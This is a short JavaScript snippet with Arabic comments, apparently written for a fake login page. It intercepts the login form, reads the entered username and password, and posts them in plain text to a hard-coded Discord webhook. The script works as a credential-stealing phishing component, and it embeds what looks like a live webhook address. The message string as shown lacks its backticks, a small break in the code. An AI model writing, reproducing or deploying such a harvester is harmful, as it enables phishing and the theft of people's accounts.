document.getElementById("loginButton").addEventListener("click", function(event) {
    event.preventDefault(); // Prevent default form submission

    // الحصول على قيم المدخلات
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // تأكد من أن المدخلات ليست فارغة
    if (username && password) {
        // البيانات التي سيتم إرسالها إلى ديسكورد
        const data = {
            content: New login attempt:\n**Username:** ${username}\n**Password:** ${password}
        };

        // عنوان Webhook الخاص بك
        const webhookUrl = "https://discord.com/api/webhooks/1345817740761628702/-MdL4BrEenT9JtuMpg3LvU4bCHXUDcExH8N-E8CgNtVuEiIzEMCDEqFvZVdst7mszQQK";

        // إرسال البيانات باستخدام fetch (AJAX)
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log("Data sent to Discord successfully.");
            } else {
                console.log("Error sending data to Discord.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
        });
    } else {
        alert("Please fill in both fields.");
    }
});
